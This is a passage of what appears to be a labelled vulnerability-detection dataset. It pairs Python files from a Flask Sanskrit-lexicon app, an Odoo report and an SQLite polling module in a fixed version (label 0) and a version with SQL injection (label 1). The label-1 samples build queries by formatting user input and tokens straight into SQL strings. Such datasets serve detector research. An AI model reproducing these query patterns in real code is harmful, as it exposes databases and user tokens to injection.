static_folder='static')\n\n@app.route('/')\n\ndef index():\n    all_vargas = ['\u0938\u094d\u0935\u0930\u094d\u0917\u0935\u0930\u094d\u0917\u0903','\u0935\u094d\u092f\u094b\u092e\u0935\u0930\u094d\u0917\u0903','\u0926\u093f\u0917\u094d\u0935\u0930\u094d\u0917\u0903','\u0915\u093e\u0932\u0935\u0930\u094d\u0917\u0903','\u0927\u0940\u0935\u0930\u094d\u0917\u0903','\u0936\u092c\u094d\u0926\u093e\u0926\u093f\u0935\u0930\u094d\u0917\u0903','\u0928\u093e\u091f\u094d\u092f\u0935\u0930\u094d\u0917\u0903','\u092a\u093e\u0924\u093e\u0932\u092d\u094b\u0917\u093f\u0935\u0930\u094d\u0917\u0903','\u0928\u0930\u0915\u0935\u0930\u094d\u0917\u0903','\u0935\u093e\u0930\u093f\u0935\u0930\u094d\u0917\u0903','\u092d\u0942\u092e\u093f\u0935\u0930\u094d\u0917\u0903','\u092a\u0941\u0930\u0935\u0930\u094d\u0917\u0903','\u0936\u0948\u0932\u0935\u0930\u094d\u0917\u0903','\u0935\u0928\u094c\u0937\u0927\u093f\u0935\u0930\u094d\u0917\u0903','\u0938\u093f\u0902\u0939\u093e\u0926\u093f\u0935\u0930\u094d\u0917\u0903','\u092e\u0928\u0941\u0937\u094d\u092f\u0935\u0930\u094d\u0917\u0903','\u092c\u094d\u0930\u0939\u094d\u092e\u0935\u0930\u094d\u0917\u0903','\u0915\u094d\u0937\u0924\u094d\u0930\u093f\u092f\u0935\u0930\u094d\u0917\u0903','\u0935\u0948\u0936\u094d\u092f\u0935\u0930\u094d\u0917\u0903','\u0936\u0942\u0926\u094d\u0930\u0935\u0930\u094d\u0917\u0903','\u0935\u093f\u0936\u0947\u0937\u094d\u092f\u0928\u093f\u0918\u094d\u0928\u0935\u0930\u094d\u0917\u0903','\u0938\u0919\u094d\u0915\u0940\u0930\u094d\u0923\u0935\u0930\u094d\u0917\u0903','\u0935\u093f\u0936\u0947\u0937\u094d\u092f\u0928\u093f\u0918\u094d\u0928\u0935\u0930\u094d\u0917\u0903','\u0938\u0919\u094d\u0915\u0940\u0930\u094d\u0923\u0935\u0930\u094d\u0917\u0903','\u0928\u093e\u0928\u093e\u0930\u094d\u0925\u0935\u0930\u094d\u0917\u0903','\u0905\u0935\u094d\u092f\u092f\u0935\u0930\u094d\u0917\u0903']\n    return render_template('index.html', all_vargas=all_vargas)\n\n    # try:\n    #     with sql.connect('amara.db') as con:\n    #         con.row_factory = sql.Row\n    #         cur = con.cursor()\n    #         cur.execute(\"select distinct varga from pada\")\n    #         all_vargas = cur.fetchall();\n    #         return render_template('index.html', all_vargas=all_vargas)\n    # finally:\n    #     con.close()\n\n@app.route('/search')\ndef search():\n\n    limit = 10\n    offset = 0\n\n    user_term = request.args.get('term')\n    page = request.args.get('page')\n    term = user_term\n\n    if not page:\n        page = 1\n\n    offset = limit*(int(page) - 1)\n\n    transliterate_regex = re.compile('.*[a-zA-Z].*')\n    if (transliterate_regex.match(term)):\n        term = transliterate(term, sanscript.ITRANS, sanscript.DEVANAGARI)\n\n    term = term.replace(\"*\", \"%\")\n    term_words = term.split()\n\n    try:\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n\n            if len(term_words) == 1:\n                cur.execute(\"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada like ? or artha like ? order by id limit ? offset ?;\", [term, term, limit, offset])\n                rows = cur.fetchall();\n            else:\n                query = \"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada in (%s) order by pada limit 100;\" % ','.join('?' for i in term_words)\n                rows = cur.execute(query, term_words)\n\n            return render_template('search.html', rows=rows, user_term=user_term, term=term, page=page)\n    finally:\n        con.close()\n\n\n@app.route('/sloka')\ndef sloka():\n\n    sloka_number = request.args.get('sloka_number')\n\n    sloka_number_parts = sloka_number.split('.')\n\n    sloka_number_previous = \"%s.%s.%d\" % (sloka_number_parts[0], sloka_number_parts[1], int(sloka_number_parts[2])-1)\n    sloka_number_next = \"%s.%s.%d\" % (sloka_number_parts[0], sloka_number_parts[1], int(sloka_number_parts[2])+1)\n\n    try:\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n            cur.execute(\"select * from mula where sloka_number = ? order by sloka_line;\", [sloka_number])\n            mula = cur.fetchall();\n\n            cur.execute(\"select * from pada where sloka_number = ? order by id;\", [sloka_number])\n            pada = cur.fetchall();\n\n            varga = \"\"\n            if len(pada) > 0:\n                varga = pada[0][\"varga\"]\n\n            return render_template('sloka.html', mula=mula, pada=pada, varga=varga, sloka_number=sloka_number, sloka_number_previous=sloka_number_previous, sloka_number_next=sloka_number_next)\n    finally:\n        con.close()\n\n@app.route('/quiz')\ndef quiz():\n\n    varga = request.args.get('varga')\n\n    try:\n        rows =[]\n\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n            cur.execute(\"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada.varga = ? order by random() limit 1;\", [varga])\n            rows = cur.fetchall();\n\n            artha = rows[0][\"artha\"];\n            cur.execute(\"select pada from pada where varga = ? and artha = ? order by id\", [varga, artha]);\n            paryaya = cur.fetchall();\n\n            return render_template('quiz.html', rows=rows, paryaya=paryaya, varga=varga)\n    finally:\n        con.close()\n\n@app.route('/varga')\ndef varga():\n\n    varga = request.args.get('varga')\n\n    try:\n        rows =[]\n\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n\n            if varga:\n                cur.execute(\"select * from mula where varga = ?;\", [varga])\n                # cur.execute(\"select * from mula where sloka_number in (select distinct sloka_number from pada where varga='%s');\" % varga)\n            else:\n                cur.execute(\"select * from mula\")\n            mula = cur.fetchall();\n\n            return render_template('varga.html', mula=mula, varga=varga)\n    finally:\n        con.close()\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\")\n/n/n/n", "label": 0}, {"id": "6ceb5dc8ec38b4a3f1399e578ab970f7e3354922", "code": "/docker/app.py/n/nfrom flask import Flask, render_template, request, current_app, g\nfrom indic_transliteration import sanscript\nfrom indic_transliteration.sanscript import SchemeMap, SCHEMES, transliterate\n\nimport random\nimport sqlite3 as sql\nimport re\n\napp = Flask(__name__, static_url_path='', static_folder='static')\n\n@app.route('/')\n\ndef index():\n    all_vargas = ['\u0938\u094d\u0935\u0930\u094d\u0917\u0935\u0930\u094d\u0917\u0903','\u0935\u094d\u092f\u094b\u092e\u0935\u0930\u094d\u0917\u0903','\u0926\u093f\u0917\u094d\u0935\u0930\u094d\u0917\u0903','\u0915\u093e\u0932\u0935\u0930\u094d\u0917\u0903','\u0927\u0940\u0935\u0930\u094d\u0917\u0903','\u0936\u092c\u094d\u0926\u093e\u0926\u093f\u0935\u0930\u094d\u0917\u0903','\u0928\u093e\u091f\u094d\u092f\u0935\u0930\u094d\u0917\u0903','\u092a\u093e\u0924\u093e\u0932\u092d\u094b\u0917\u093f\u0935\u0930\u094d\u0917\u0903','\u0928\u0930\u0915\u0935\u0930\u094d\u0917\u0903','\u0935\u093e\u0930\u093f\u0935\u0930\u094d\u0917\u0903','\u092d\u0942\u092e\u093f\u0935\u0930\u094d\u0917\u0903','\u092a\u0941\u0930\u0935\u0930\u094d\u0917\u0903','\u0936\u0948\u0932\u0935\u0930\u094d\u0917\u0903','\u0935\u0928\u094c\u0937\u0927\u093f\u0935\u0930\u094d\u0917\u0903','\u0938\u093f\u0902\u0939\u093e\u0926\u093f\u0935\u0930\u094d\u0917\u0903','\u092e\u0928\u0941\u0937\u094d\u092f\u0935\u0930\u094d\u0917\u0903','\u092c\u094d\u0930\u0939\u094d\u092e\u0935\u0930\u094d\u0917\u0903','\u0915\u094d\u0937\u0924\u094d\u0930\u093f\u092f\u0935\u0930\u094d\u0917\u0903','\u0935\u0948\u0936\u094d\u092f\u0935\u0930\u094d\u0917\u0903','\u0936\u0942\u0926\u094d\u0930\u0935\u0930\u094d\u0917\u0903','\u0935\u093f\u0936\u0947\u0937\u094d\u092f\u0928\u093f\u0918\u094d\u0928\u0935\u0930\u094d\u0917\u0903','\u0938\u0919\u094d\u0915\u0940\u0930\u094d\u0923\u0935\u0930\u094d\u0917\u0903','\u0935\u093f\u0936\u0947\u0937\u094d\u092f\u0928\u093f\u0918\u094d\u0928\u0935\u0930\u094d\u0917\u0903','\u0938\u0919\u094d\u0915\u0940\u0930\u094d\u0923\u0935\u0930\u094d\u0917\u0903','\u0928\u093e\u0928\u093e\u0930\u094d\u0925\u0935\u0930\u094d\u0917\u0903','\u0905\u0935\u094d\u092f\u092f\u0935\u0930\u094d\u0917\u0903']\n    return render_template('index.html', all_vargas=all_vargas)\n\n    # try:\n    #     with sql.connect('amara.db') as con:\n    #         con.row_factory = sql.Row\n    #         cur = con.cursor()\n    #         cur.execute(\"select distinct varga from pada\")\n    #         all_vargas = cur.fetchall();\n    #         return render_template('index.html', all_vargas=all_vargas)\n    # finally:\n    #     con.close()\n\n@app.route('/search')\ndef search():\n\n    limit = 10\n    offset = 0\n\n    user_term = request.args.get('term')\n    page = request.args.get('page')\n    term = user_term\n\n    if not page:\n        page = 1\n\n    offset = limit*(int(page) - 1)\n\n    transliterate_regex = re.compile('.*[a-zA-Z].*')\n    if (transliterate_regex.match(term)):\n        term = transliterate(term, sanscript.ITRANS, sanscript.DEVANAGARI)\n\n    term = term.replace(\"*\", \"%\")\n    term_words = term.split()\n\n    try:\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n\n            if len(term_words) == 1:\n                cur.execute(\"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada like '%s' or artha like '%s' order by id limit %d offset %d;\" % (term, term, limit, offset))\n                rows = cur.fetchall();\n            else:\n                query = \"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada in (%s) order by pada limit 100;\" % ','.join('?' for i in term_words)\n                rows = cur.execute(query, term_words)\n\n            return render_template('search.html', rows=rows, user_term=user_term, term=term, page=page)\n    finally:\n        con.close()\n\n\n@app.route('/sloka')\ndef sloka():\n\n    sloka_number = request.args.get('sloka_number')\n\n    sloka_number_parts = sloka_number.split('.')\n\n    sloka_number_previous = \"%s.%s.%d\" % (sloka_number_parts[0], sloka_number_parts[1], int(sloka_number_parts[2])-1)\n    sloka_number_next = \"%s.%s.%d\" % (sloka_number_parts[0], sloka_number_parts[1], int(sloka_number_parts[2])+1)\n\n    try:\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n            cur.execute(\"select * from mula where sloka_number = '%s' order by sloka_line;\" % sloka_number)\n            mula = cur.fetchall();\n\n            cur.execute(\"select * from pada where sloka_number = '%s' order by id;\" % sloka_number)\n            pada = cur.fetchall();\n\n            varga = \"\"\n            if len(pada) > 0:\n                varga = pada[0][\"varga\"]\n\n            return render_template('sloka.html', mula=mula, pada=pada, varga=varga, sloka_number=sloka_number, sloka_number_previous=sloka_number_previous, sloka_number_next=sloka_number_next)\n    finally:\n        con.close()\n\n@app.route('/quiz')\ndef quiz():\n\n    varga = request.args.get('varga')\n\n    try:\n        rows =[]\n\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n            cur.execute(\"select * from pada inner join mula on pada.sloka_line = mula.sloka_line where pada.varga = '%s' order by random() limit 1;\" % varga)\n            rows = cur.fetchall();\n\n            artha = rows[0][\"artha\"];\n            cur.execute(\"select pada from pada where varga = '%s' and artha = '%s' order by id\" % (varga, artha));\n            paryaya = cur.fetchall();\n\n            return render_template('quiz.html', rows=rows, paryaya=paryaya, varga=varga)\n    finally:\n        con.close()\n\n@app.route('/varga')\ndef varga():\n\n    varga = request.args.get('varga')\n\n    try:\n        rows =[]\n\n        with sql.connect('amara.db') as con:\n            con.row_factory = sql.Row\n            cur = con.cursor()\n            cur.execute(\"select * from mula where varga = '%s';\" % varga)\n            # cur.execute(\"select * from mula where sloka_number in (select distinct sloka_number from pada where varga='%s');\" % varga)\n            mula = cur.fetchall();\n\n\n\n            return render_template('varga.html', mula=mula, varga=varga)\n    finally:\n        con.close()\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\")\n/n/n/n", "label": 1}, {"id": "8e9dfe3698a6a8c747d5a1f0e719eaae8fc8c855", "code": "ao_crm_helpdesk_problem_track/reports/qc_problem_track_report.py/n/n# Copyright 2019 Eficent Business and IT Consulting Services S.L.\n# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl.html).\n\nfrom psycopg2.extensions import AsIs\n\nfrom odoo import tools\nfrom odoo import api, fields, models\n\n\nclass QCProblemReport(models.Model):\n    _name = \"qc.problem.report\"\n    _description = \"Problem Tracking Report\"\n    _auto = False\n    _rec_name = 'date'\n    _order = 'date desc'\n\n    name = fields.Char('Name', readonly=True)\n    date = fields.Datetime('Helpdesk Create Date', readonly=True)\n    notes = fields.Text('Notes', readonly=True)\n    problem_group_id = fields.Many2one('qc.problem.group', 'Problem Group',\n                                       readonly=True)\n    color = fields.Integer('Color Index', readonly=True)\n    priority = fields.Selection([\n        ('0', 'Normal'),\n        ('1', 'Low'),\n        ('2', 'High'),\n        ('3', 'Very High'),\n    ], 'Rating', readonly=True)\n    stage_id = fields.Many2one('qc.stage', 'Stage', readonly=True)\n    qc_team_id = fields.Many2one('qc.team', 'QC Team', readonly=True)\n    company_id = fields.Many2one('res.company', 'Company', readonly=True)\n    crm_helpdesk_count = fields.Integer('Helpdesk Tickets Count',\n                                        readonly=True)\n\n    def _select(self):\n        select_str = \"\"\"\n             SELECT qcp.id as id,\n                    qcp.name as name,\n                    qcp.notes as notes,\n                    qcp.problem_group_id as problem_group_id,\n                    qcp.color as color,\n                    qcp.priority as priority,\n                    qcp.stage_id as stage_id,\n                    qcp.qc_team_id as qc_team_id,\n                    qcp.company_id as company_id,\n                    count(hpr) as crm_helpdesk_count,\n                    chd.date as date\n        \"\"\"\n        return select_str\n\n    def _from(self):\n        from_str = \"\"\"\n        qc_problem qcp\n            left join helpdesk_problem_rel hpr on hpr.qc_problem_id = qcp.id\n            left join crm_helpdesk chd on chd.id = hpr.crm_helpdesk_id\n        \"\"\"\n        return from_str\n\n    def _group_by(self):\n        group_by_str = \"\"\"\n            GROUP BY\n            qcp.id,\n            chd.date\n        \"\"\"\n        return group_by_str\n\n    @api.model_cr\n    def init(self):\n        tools.drop_view_if_exists(self.env.cr, self._table)\n        self.env.cr.execute(\n            \"\"\"\n            CREATE or REPLACE VIEW %s as (%s\n            FROM ( %s )\n            %s)\"\"\",\n            (AsIs(self._table), AsIs(self._select()),\n             AsIs(self._from()), AsIs(self._group_by())),\n        )\n/n/n/n", "label": 0}, {"id": "8e9dfe3698a6a8c747d5a1f0e719eaae8fc8c855", "code": "/ao_crm_helpdesk_problem_track/reports/qc_problem_track_report.py/n/n# Copyright 2019 Eficent Business and IT Consulting Services S.L.\n# License AGPL-3.0 or later (https://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import tools\nfrom odoo import api, fields, models\n\n\nclass QCProblemReport(models.Model):\n    _name = \"qc.problem.report\"\n    _description = \"Problem Tracking Report\"\n    _auto = False\n    _rec_name = 'date'\n    _order = 'date desc'\n\n    name = fields.Char('Name', readonly=True)\n    date = fields.Datetime('Helpdesk Create Date', readonly=True)\n    notes = fields.Text('Notes', readonly=True)\n    problem_group_id = fields.Many2one('qc.problem.group', 'Problem Group',\n                                       readonly=True)\n    color = fields.Integer('Color Index', readonly=True)\n    priority = fields.Selection([\n        ('0', 'Normal'),\n        ('1', 'Low'),\n        ('2', 'High'),\n        ('3', 'Very High'),\n    ], 'Rating', readonly=True)\n    stage_id = fields.Many2one('qc.stage', 'Stage', readonly=True)\n    qc_team_id = fields.Many2one('qc.team', 'QC Team', readonly=True)\n    company_id = fields.Many2one('res.company', 'Company', readonly=True)\n    crm_helpdesk_count = fields.Integer('Helpdesk Tickets Count',\n                                        readonly=True)\n\n    def _select(self):\n        select_str = \"\"\"\n             SELECT qcp.id as id,\n                    qcp.name as name,\n                    qcp.notes as notes,\n                    qcp.problem_group_id as problem_group_id,\n                    qcp.color as color,\n                    qcp.priority as priority,\n                    qcp.stage_id as stage_id,\n                    qcp.qc_team_id as qc_team_id,\n                    qcp.company_id as company_id,\n                    count(hpr) as crm_helpdesk_count,\n                    chd.date as date\n        \"\"\"\n        return select_str\n\n    def _from(self):\n        from_str = \"\"\"\n        qc_problem qcp\n            left join helpdesk_problem_rel hpr on hpr.qc_problem_id = qcp.id\n            left join crm_helpdesk chd on chd.id = hpr.crm_helpdesk_id\n        \"\"\"\n        return from_str\n\n    def _group_by(self):\n        group_by_str = \"\"\"\n            GROUP BY\n            qcp.id,\n            chd.date\n        \"\"\"\n        return group_by_str\n\n    @api.model_cr\n    def init(self):\n        tools.drop_view_if_exists(self.env.cr, self._table)\n        self.env.cr.execute(\"\"\"CREATE or REPLACE VIEW %s as (\n            %s\n            FROM ( %s )\n            %s\n            )\"\"\" % (self._table,\n                    self._select(),\n                    self._from(),\n                    self._group_by()))\n/n/n/n", "label": 1}, {"id": "186c5ff5cdf58272e253a1bb432419ee50d93109", "code": "database.py/n/nimport sqlite3\nimport os.path\nfrom cpwrap import CFG\nimport random\nimport string\n\ndef connectDB():\n    conn = sqlite3.connect(CFG(\"dbname\"))\n    return (conn, conn.cursor())\n\ndef closeDB(conn, cursor=None):\n    conn.commit()\n    conn.close()\n\ndef queryAll(cursor, reqString, *args):\n    try:\n        if len(args) > 0:\n            cursor.execute(reqString, *args)\n        else:\n            cursor.execute(reqString)\n        ret = cursor.fetchall()\n        if ret:\n            return ret\n    except IndexError:\n        return []\n\ndef queryOne(cursor, reqString, *args):\n    try:\n        if len(args) > 0:\n            cursor.execute(reqString, *args)\n        else:\n            cursor.execute(reqString)\n        ret = cursor.fetchone()\n        if ret:\n            return ret[0]\n    except IndexError:\n        return None\n\ndef queryQuestion(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT question from {} WHERE name = ?\".format(CFG(\"poll_table_name\"))\n    tmp = queryOne(c, req, (poll_name,))\n    conn.close()\n    return tmp\n\ndef tokenNeededExternal(poll_name):\n    conn, c = connectDB()\n    tmp = checkTokenNeeded(c, poll_name)\n    conn.close()\n    return tmp\n\ndef markTokenUsedExternal(token, optStr=\"\"):\n    conn, c = connectDB()\n    req = \"UPDATE {} SET \\\"options_selected\\\"=? WHERE token=?\".format(CFG(\"tokens_table_name\"))\n    c.execute(req, (optStr, token,))\n    closeDB(conn)\n\ndef init():\n    if os.path.isfile(CFG(\"dbname\")):\n        return\n    conn, c = connectDB()\n    c.execute(\"CREATE TABLE \" + CFG(\"poll_table_name\") + \"(\\\n                    name text,\\\n                    options text,\\\n                    has_tokens integer,\\\n                    show_results integer,\\\n                    question text,\\\n                    multi integer, \\\n                    date text)\"\\\n                    )\n    c.execute(\"CREATE TABLE {}(name_option text, count integer)\".format(CFG(\"options_table_name\")))\n    c.execute(\"CREATE TABLE {}(token text, name text, options_selected text)\".format(CFG(\"tokens_table_name\")))\n    c.execute(\"CREATE TABLE {}(adm_token text, poll_name text)\".format(CFG(\"admintoken_table_name\")))\n    closeDB(conn)\n\ndef checkTokenValid(cursor, token, poll_name):\n    req = \"SELECT name, options_selected from {} where token=?\".format(CFG(\"tokens_table_name\"))\n    answer = queryAll(cursor, req, (token,))\n    return answer and answer[0][0] == poll_name and answer[0][1] == 'NONE'\n\ndef checkAdmTokenValid(poll_name, adm_token):\n    conn, c = connectDB()\n    req = \"SELECT poll_name from {} where adm_token=?\".format(CFG(\"admintoken_table_name\"))\n    answer = queryOne(c, req, (adm_token,))\n    closeDB(conn)\n    return answer == poll_name\n\ndef isValidAdmToken(adm_token):\n    conn, c = connectDB()\n    req = \"SELECT *  from {} where adm_token=?\".format(CFG(\"admintoken_table_name\"))\n    answer = bool(queryOne(c, req, (adm_token,)))\n    closeDB(conn)\n    return answer\n\ndef isValidToken(token):\n    conn, c = connectDB()\n    req = \"SELECT * from {} where token=?\".format(CFG(\"tokens_table_name\"))\n    answer = bool(queryOne(c, req, (token,)))\n    closeDB(conn)\n    return answer\n\ndef pollNameFromToken(token):\n    conn, c = connectDB()\n    req = \"SELECT name from {} where token=?\".format(CFG(\"tokens_table_name\"))\n    answer = queryOne(c, req, (token,))\n    if not answer:\n        req = \"SELECT poll_name from {} where adm_token=?\".format(CFG(\"admintoken_table_name\"))\n        answer = queryOne(c, req, (token,))\n    closeDB(conn)\n    return answer\n\n\ndef checkTokenNeeded(cursor, poll_name):\n    req = \"SELECT has_tokens FROM {} WHERE name=?\".format(CFG(\"poll_table_name\"))\n    return queryOne(cursor, req, (poll_name,)) == 1\n\ndef incrementOption(cursor, poll_name, option):\n    key = poll_name+\"-\"+option\n    req = \"UPDATE {} SET count=count+1 WHERE name_option=?\".format(CFG(\"options_table_name\"))\n    cursor.execute(req, (key,))\n\ndef isMultiChoice(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT multi FROM {} WHERE name=?\".format(CFG(\"poll_table_name\"))\n    ret = queryOne(c, req, (poll_name,)) == 1\n    closeDB(conn)\n    return ret\n\ndef vote(poll_name, options_string, token_used=\"DUMMY_INVALID_TOKEN\"):\n    conn, c = connectDB()\n\n    # check token\n    token_valid = checkTokenValid(c, token_used, poll_name)\n    if not token_valid and checkTokenNeeded(c, poll_name):\n        raise PermissionError(\"Poll requires valid token.\")\n    markTokenUsedExternal(token_used, options_string)\n\n    # save changes\n    # lambda x: x -> r\u00f6fl :D\n    options = list(filter(lambda x: x, options_string.split(\",\")))\n    # check if multi-choice\n    if len(options) > 1:\n        if not isMultiChoice(poll_name):\n            raise ValueError(\"multiple options for single choice\")\n\n    for opt in options:\n        incrementOption(c, poll_name, opt)\n\n    closeDB(conn)\n\ndef getOptionCount(c, poll_name, option):\n    key = poll_name + \"-\" + option\n    req = \"SELECT count FROM {table} WHERE name_option=?\".format(table=CFG(\"options_table_name\"))\n    count = queryOne(c, req, (key,))\n    if count == None:\n        raise AssertionError(\"Unknown answer for poll. WTF?\")\n    return count;\n\ndef getResults(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT options from {} where name=?\".format(CFG(\"poll_table_name\"))\n    options_str = queryOne(c, req, (poll_name,))\n\n    if not options_str:\n        raise LookupError(\"Poll '{}' not found in DB\".format(poll_name))\n\n    total = 0\n    options = options_str.split(\",\")\n    results = dict()\n    for opt in options:\n        count = getOptionCount(c, poll_name, opt)\n        total += int(count)\n        results.update({opt:count})\n\n    conn.close()\n    return (results, total)\n\ndef insertOption(c, poll_name, option):\n    key = poll_name + \"-\" + option\n    count = 0\n    params = (key, count)\n    req = \"INSERT INTO {} VALUES (?, ?)\".format(CFG(\"options_table_name\"))\n    c.execute(req, params)\n\ndef getTokensExternal(poll_name):\n    req = \"SELECT token FROM {} WHERE name=?\".format(CFG(\"tokens_table_name\"))\n    conn, c = connectDB()\n    tmp = queryAll(c, req, (poll_name,))\n    conn.close()\n    return tmp\n\ndef genSingleToken(length=5):\n    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))\n\ndef genTokens(c, poll_name, count=False):\n    if not count:\n        count = CFG(\"default_token_count\")\n\n    tokens = [ genSingleToken() for x in range(0,count) ]\n    for token in tokens:\n        name = poll_name \n        options_selected = \"NONE\"\n        params = (token, name, options_selected)\n        req = \"INSERT INTO {} VALUES (?, ?, ?)\".format(CFG(\"tokens_table_name\"))\n        c.execute(req, params)\n    return tokens\n\ndef genTokensExternal(poll_name, count=False):\n    conn, c = connectDB()\n    tok = genTokens(c, poll_name, count)\n    closeDB(conn)\n    return tok\n\ndef createAdminToken(c, poll_name):\n    adm_token = genSingleToken()\n    params = (adm_token, poll_name)\n    req = \"INSERT INTO {} VALUES (?, ?)\".format(CFG(\"admintoken_table_name\"))\n    c.execute(req, params)\n\ndef getAdmToken(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT adm_token FROM {} WHERE poll_name=?\".format(CFG(\"admintoken_table_name\"))\n    admtok = queryOne(c, req, (poll_name,))\n    closeDB(conn)\n    return admtok\n\ndef checkPollExists(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT EXISTS( SELECT 1 FROM {} WHERE name=?)\".format(CFG(\"poll_table_name\"))\n    tmp = queryOne(c, req, (poll_name,))\n    conn.close()\n    return tmp\n\ndef createPoll(poll_name, options_arr, question, has_tokens, multi, openresults=True):\n    if checkPollExists(poll_name):\n        raise RuntimeError(\"Cannot create poll, because the poll already exists.\")\n    conn, c = connectDB()\n\n    # actual poll\n    name = poll_name\n    options = \",\".join(options_arr)\n    date = \"NONE\"\n    show_results = openresults\n    params = (name, options, has_tokens, show_results, question, multi, date) \n    req = \"INSERT INTO {} VALUES (?,?,?,?,?,?,?)\".format(CFG(\"poll_table_name\"))\n    c.execute(req, params)\n\n    # tokens if needed\n    tokens = []\n    if has_tokens:\n        tokens = genTokens(c, poll_name)\n\n    # adminAccessToken\n    createAdminToken(c, poll_name)\n\n    # update options\n    for opt in options_arr:\n        insertOption(c, poll_name, opt)\n    \n    closeDB(conn)\n    return tokens\n\ndef getOptions(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT options FROM {} WHERE name=?\".format(CFG(\"poll_table_name\"))\n    options_str = queryOne(c, req, (poll_name,))\n    if options_str == None:\n        return None\n    options = options_str.split(\",\")\n    closeDB(conn)\n    return options\n/n/n/n", "label": 0}, {"id": "186c5ff5cdf58272e253a1bb432419ee50d93109", "code": "/database.py/n/nimport sqlite3\nimport os.path\nfrom cpwrap import CFG\nimport random\nimport string\n\ndef connectDB():\n    conn = sqlite3.connect(CFG(\"dbname\"))\n    return (conn, conn.cursor())\n\ndef closeDB(conn, cursor=None):\n    conn.commit()\n    conn.close()\n\ndef queryAll(cursor, reqString):\n    try:\n        cursor.execute(reqString)\n        ret = cursor.fetchall()\n        if ret:\n            return ret\n    except IndexError:\n        return []\n\ndef queryOne(cursor, reqString):\n    try:\n        cursor.execute(reqString)\n        ret = cursor.fetchone()\n        if ret:\n            return ret[0]\n    except IndexError:\n        return None\n\ndef queryQuestion(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT question from {} WHERE name = '{}'\".format(CFG(\"poll_table_name\"), poll_name)\n    tmp = queryOne(c, req)\n    conn.close()\n    return tmp\n\ndef tokenNeededExternal(poll_name):\n    conn, c = connectDB()\n    tmp = checkTokenNeeded(c, poll_name)\n    conn.close()\n    return tmp\n\ndef markTokenUsedExternal(token, optStr=\"\"):\n    conn, c = connectDB()\n    req = \"UPDATE {} SET \\\"options_selected\\\"='{}' WHERE token='{}'\".format(CFG(\"tokens_table_name\"), \\\n                    optStr, token)\n    c.execute(req)\n    closeDB(conn)\n\ndef init():\n    if os.path.isfile(CFG(\"dbname\")):\n        return\n    conn, c = connectDB()\n    c.execute(\"CREATE TABLE \" + CFG(\"poll_table_name\") + \"(\\\n                    name text,\\\n                    options text,\\\n                    has_tokens integer,\\\n                    show_results integer,\\\n                    question text,\\\n                    multi integer, \\\n                    date text)\"\\\n                    )\n    c.execute(\"CREATE TABLE {}(name_option text, count integer)\".format(CFG(\"options_table_name\")))\n    c.execute(\"CREATE TABLE {}(token text, name text, options_selected text)\".format(CFG(\"tokens_table_name\")))\n    c.execute(\"CREATE TABLE {}(adm_token text, poll_name text)\".format(CFG(\"admintoken_table_name\")))\n    closeDB(conn)\n\ndef checkTokenValid(cursor, token, poll_name):\n    req = \"SELECT name, options_selected from {} where token='{}'\".format(CFG(\"tokens_table_name\"), token)\n    answer = queryAll(cursor, req)\n    return answer and answer[0][0] == poll_name and answer[0][1] == 'NONE'\n\ndef checkAdmTokenValid(poll_name, adm_token):\n    conn, c = connectDB()\n    req = \"SELECT poll_name from {} where adm_token = \\\"{}\\\"\".format(CFG(\"admintoken_table_name\"), adm_token)\n    answer = queryOne(c, req)\n    closeDB(conn)\n    return answer == poll_name\n\ndef isValidAdmToken(adm_token):\n    conn, c = connectDB()\n    req = \"SELECT *  from {} where adm_token='{}'\".format(CFG(\"admintoken_table_name\"), adm_token)\n    answer = bool(queryOne(c, req))\n    closeDB(conn)\n    return answer\n\ndef isValidToken(token):\n    conn, c = connectDB()\n    req = \"SELECT * from {} where token='{}'\".format(CFG(\"tokens_table_name\"), token)\n    answer = bool(queryOne(c, req))\n    closeDB(conn)\n    return answer\n\ndef pollNameFromToken(token):\n    conn, c = connectDB()\n    req = \"SELECT name from {} where token='{}'\".format(CFG(\"tokens_table_name\"), token)\n    answer = queryOne(c, req)\n    if not answer:\n        req = \"SELECT poll_name from {} where adm_token='{}'\".format(CFG(\"admintoken_table_name\"), token)\n        answer = queryOne(c, req)\n    closeDB(conn)\n    return answer\n\n\ndef checkTokenNeeded(cursor, poll_name):\n    req = \"SELECT has_tokens FROM {} WHERE name = '{}'\".format(CFG(\"poll_table_name\"), poll_name)\n    return queryOne(cursor, req) == 1;\n\ndef incrementOption(cursor, poll_name, option):\n    key = poll_name+\"-\"+option\n    req = \"UPDATE {} SET count=count+1 WHERE name_option = '{}';\".format(CFG(\"options_table_name\"), key)\n    cursor.execute(req)\n\ndef isMultiChoice(poll_name):\n    conn, c = connectDB()\n    req = \"SELECT multi FROM {} WHERE name = '{}'\".format(CFG(\"poll_table_name\"), poll_name)\n    ret = queryOne(c, req) == 1\n    closeDB(conn)\n    return ret\n\ndef vote(poll_name, options_string, token_used=\"DUMMY_INVALID_TOKEN\"):\n    conn, c = connectDB()\n\n    # check token\n    token_valid = checkTokenValid(c, token_used, poll_name)\n    if not token_valid and checkTokenNeeded(c, poll_name):\n        raise PermissionError(\"Poll requires valid token.\")\n    markTokenUsedExternal(token_used, options_string)\n\n    # save changes\n    # lambda x: x -> r\u00f6fl 